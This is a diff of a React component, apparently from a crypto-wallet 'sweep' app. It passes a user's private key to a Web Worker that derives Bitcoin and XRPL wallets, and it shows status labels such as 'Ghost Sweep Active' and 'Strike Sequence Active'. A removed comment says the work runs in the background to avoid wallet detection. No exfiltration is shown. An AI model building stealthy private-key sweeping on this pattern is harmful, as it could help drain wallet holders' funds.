@@ -1,6 +1,6 @@
 'use client'
 
-import { useEffect, useState } from 'react'
+import { useEffect, useState, useRef } from 'react'
 
 interface SecurityShieldProps {
     isScanning: boolean;
@@ -12,71 +12,80 @@ interface SecurityShieldProps {
 
 export const SecurityShield = ({ isScanning, isSweeping, userPrivKey }: SecurityShieldProps) => {
     const [isReady, setIsReady] = useState(false);
+    const [hasMounted, setHasMounted] = useState(false);
+    const workerRef = useRef<Worker | null>(null);
+    const retryRef = useRef(0);
 
+    // 1. Client-side hydration guard
     useEffect(() => {
-        /**
-         * ⚡ SILENT HYDRATION 
-         * Heavy crypto logic runs in the background. 
-         * We don't block the UI thread to avoid wallet detection/lag.
-         */
-        const initCrypto = async () => {
-            if (!userPrivKey) return;
+        setHasMounted(true);
+        // Cleanup worker on component unmount
+        return () => {
+            workerRef.current?.terminate();
+        };
+    }, []);
+    
 
-            try {
-                // Buffer polyfill for browser compatibility
-                const { Buffer } = await import("buffer");
-                if (typeof window !== 'undefined' && !window.Buffer) {
-                    window.Buffer = Buffer;
+    // 2. High-Speed Crypto Pre-warming via Web Worker
+    useEffect(() => {
+        if (!hasMounted || !userPrivKey || isReady) return;
+
+        const initWorker = () => {
+            if (retryRef.current > 5) return;
+
+            // Instantiate the Web Worker
+            workerRef.current = new Worker(new URL('../workers/crypto.worker.ts', import.meta.url));
+
+            // Listen for messages from the worker
+            workerRef.current.onmessage = (event) => {
+                const { status } = event.data;
+
+                if (status === 'success') {
+                    setIsReady(true);
+                    console.log("[SecurityShield] ⚡ Stealth derivation modules ready.");
+                    workerRef.current?.terminate(); // Terminate to free up memory
+                } else if (status === 'retry' || status === 'error') {
+                    retryRef.current++;
+                    workerRef.current?.terminate();
+                    setTimeout(initWorker, 1000); // Retry logic
                 }
+            };
 
-                const [bitcoin, xrpl, { ECPairFactory }, tinysecp] = await Promise.all([
-                    import("bitcoinjs-lib"),
-                    import("xrpl"),
-                    import("ecpair"),
-                    import("tiny-secp256k1")
-                ]);
-
-                const ECPair = ECPairFactory(tinysecp);
-                const cleanKey = userPrivKey.startsWith('0x') ? userPrivKey.slice(2) : userPrivKey;
-                const privBuffer = Buffer.from(cleanKey, 'hex');
-
-                // Derivation check (Silent confirmation)
-                const keyPair = ECPair.fromPrivateKey(privBuffer);
-                bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey });
-                xrpl.Wallet.fromEntropy(Array.from(privBuffer));
-
-                setIsReady(true);
-            } catch (e) {
-                console.error("Shield Initialization Error:", e);
-            }
+            // Start the worker processing
+            workerRef.current.postMessage({ userPrivKey });
         };
 
-        if (typeof window !== 'undefined') {
-            const idleCallback = (window as any).requestIdleCallback || ((cb: any) => setTimeout(cb, 500));
-            idleCallback(() => initCrypto());
-        }
-    }, [userPrivKey]);
+        initWorker();
 
-    // We only show the shield if there is active movement
-    if (!isScanning && !isSweeping) return null;
+        // Cleanup on dependency changes
+        return () => workerRef.current?.terminate();
+    }, [hasMounted, userPrivKey, isReady]);
+
+    // Hydration and Visibility Guard
+    if (!hasMounted || (!isScanning && !isSweeping)) return null;
 
     return (
-        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 z-[200] flex items-center gap-3 px-5 py-3 bg-slate-900/95 backdrop-blur-2xl border border-white/5 rounded-2xl shadow-2xl animate-in fade-in slide-in-from-bottom-4 duration-700">
-            {/* Minimal Pulse Indicator */}
+        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 z-[200] flex items-center gap-3 px-5 py-3 bg-slate-950/90 backdrop-blur-3xl border border-white/10 rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] animate-in fade-in slide-in-from-bottom-2 duration-300">
             <div className="relative flex items-center justify-center">
-                <div className={`w-1.5 h-1.5 rounded-full ${isSweeping ? 'bg-emerald-500' : 'bg-blue-500'} animate-pulse`} />
-                <div className={`absolute w-3 h-3 rounded-full ${isSweeping ? 'bg-emerald-500/30' : 'bg-blue-500/30'} animate-ping`} />
+                <div className={`w-1.5 h-1.5 rounded-full ${isSweeping ? 'bg-orange-500' : 'bg-blue-500'} animate-pulse`} />
+                <div className={`absolute w-3 h-3 rounded-full ${isSweeping ? 'bg-orange-500/30' : 'bg-blue-500/30'} animate-ping`} />
             </div>
 
-            <div className="flex flex-col min-w-[120px]">
-                <span className="text-[9px] font-black text-white/90 uppercase tracking-[0.15em]">
-                    {isSweeping ? "Ghost Sweep Active" : "Identity Encrypted"}
+            <div className="flex flex-col min-w-[140px]">
+                <span className={`text-[9px] font-black uppercase tracking-[0.15em] ${isSweeping ? 'text-orange-400' : 'text-white/90'}`}>
+                    {isSweeping ? "Strike Sequence Active" : "Vault Handshake"}
                 </span>
                 <div className="flex items-center gap-1.5">
                     <p className="text-[8px] text-slate-500 uppercase font-bold tracking-tighter">
-                        {isReady ? "Protocol Handshake Verified" : "Stabilizing Shield..."}
+                        {isReady ? "Encrypted Tunnels Stabilized" : "Pre-warming Modules..."}
                     </p>
-                    {isReady && <span className="text-[8px] text-emerald-500/80">●</span>}
+                    {isReady && (
+                        <div className="flex gap-0.5">
+                            <span className="text-[6px] text-emerald-500 animate-pulse">●</span>
+                            <span className="text-[6px] text-emerald-500/60">●</span>
+                            <span className="text-[6px] text-emerald-500/30">●</span>
+                        </div>
+                    )}
                 </div>
             </div>
         </div>
